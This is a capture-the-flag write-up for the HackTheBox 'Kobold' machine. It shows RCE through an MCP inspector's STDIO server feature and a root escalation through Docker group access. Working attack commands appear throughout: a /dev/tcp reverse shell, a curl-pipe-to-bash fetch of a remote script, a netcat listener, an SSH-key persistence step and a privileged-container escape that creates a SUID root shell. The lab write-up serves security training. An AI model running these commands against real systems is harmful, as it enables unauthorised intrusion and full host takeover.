# HackTheBox — Kobold Writeup

**Difficulty:** Hard  
**OS:** Linux (Ubuntu 24.04)  
**IP:** 10.129.32.68

---

## Summary

Kobold is a hard Linux box centered around MCP (Model Context Protocol) tooling, Docker management, and container escape. The foothold is gained by abusing the MCPJam Inspector's STDIO server feature to achieve remote code execution as `ben`. Privilege escalation to root exploits a hidden Docker group membership, using `sg docker` to activate suppressed supplementary groups and then escaping to root via a privileged container mount.

---

## Reconnaissance

### Port Scan

```
22   SSH
80   HTTP (redirects to kobold.htb)
443  HTTPS (kobold.htb)
3552 Arcane Docker Management
```

### Virtual Hosts

Adding the following to `/etc/hosts`:
```
10.129.32.68  kobold.htb bin.kobold.htb mcp.kobold.htb
```

- `kobold.htb` — static landing page
- `bin.kobold.htb` — PrivateBin 2.0.2 instance (Docker container)
- `mcp.kobold.htb` — MCPJam Inspector v1.4.2

---

## Foothold — MCPJam STDIO RCE

### MCPJam Inspector

MCPJam Inspector is a web-based tool for testing MCP (Model Context Protocol) servers. It supports both HTTP and **STDIO** transport modes. When a STDIO server is added, MCPJam executes the provided command directly on the server.

### Exploitation

On Kali, prepare a reverse shell script and serve it:

```bash
echo 'bash -i >& /dev/tcp/10.10.15.168/4444 0>&1' > /tmp/s.sh
python3 -m http.server 8000
```

Start a listener:

```bash
nc -lvnp 4444
```

In the MCPJam web interface at `https://mcp.kobold.htb`, add a new STDIO server with the command:

```
curl -sk http://10.10.15.168:8000/s.sh|bash
```

When MCPJam connects to initialize the STDIO server, it executes the command server-side, fetching and running the reverse shell. This lands a shell as `ben`.

### Stabilisation & Persistence

Immediately add an SSH key for persistent access:

```bash
mkdir -p ~/.ssh
echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
```

SSH in for a stable shell:

```bash
ssh -i ~/.ssh/id_rsa ben@10.129.32.68 -t "bash --norc --noprofile"
```

### User Flag

```bash
cat /home/ben/user.txt
```

---

## Privilege Escalation — Hidden Docker Group

### The Problem with Non-Interactive Shells

Running `id` from the reverse shell shows:

```
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

The `docker` group appears missing. This is because non-interactive shells spawned via MCPJam do **not** inherit all supplementary groups from `/etc/group`. The groups are present in the system but not activated for the session.

### Confirming Docker Group Access

Use `sg` (switch group) to explicitly activate the docker group:

```bash
sg docker -c "id"
```

Output:
```
uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
```

Ben is indeed in the `docker` group. Confirm access:

```bash
sg docker -c "docker images"
```

```
REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE
mysql                         latest    f66b7a288113   2 months ago   922MB
privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731   5 months ago   122MB
```

### Docker Container Escape

The box has no internet access, so pull from available images. Use the `mysql` image (which runs as root) to mount the host filesystem and create an SUID bash binary:

```bash
sg docker -c "docker run -v /:/host --rm --privileged --user 0:0 --entrypoint /bin/bash mysql:latest -c 'cp /host/bin/bash /host/tmp/rootbash && chmod 4755 /host/tmp/rootbash'"
```

Then on the host:

```bash
ls -la /tmp/rootbash
# -rwsr-xr-x 1 root root ... /tmp/rootbash

/tmp/rootbash -p
whoami
# root
```

### Root Flag

```bash
cat /root/root.txt
```

---

## Key Takeaways

**Always check for hidden group memberships.** The standard `id` command in a non-interactive shell may not show all supplementary groups. Use `sg groupname -c "id"` or check `/etc/group` directly to enumerate groups the current user belongs to.

**MCPJam STDIO is a direct RCE vector.** Any user who can add STDIO servers to MCPJam Inspector gets arbitrary command execution under the MCPJam process user. There is no sandbox or validation of commands.

**Docker group = root.** Membership in the docker group is equivalent to root access. A privileged container with the host filesystem mounted allows full host compromise.

---

## Full Attack Chain

```
MCPJam STDIO RCE (curl|bash)
        ↓
Shell as ben (uid=1001)
        ↓
sg docker → hidden docker group activated
        ↓
docker run --privileged -v /:/host mysql:latest
        ↓
SUID bash binary → /tmp/rootbash -p
        ↓
root
```
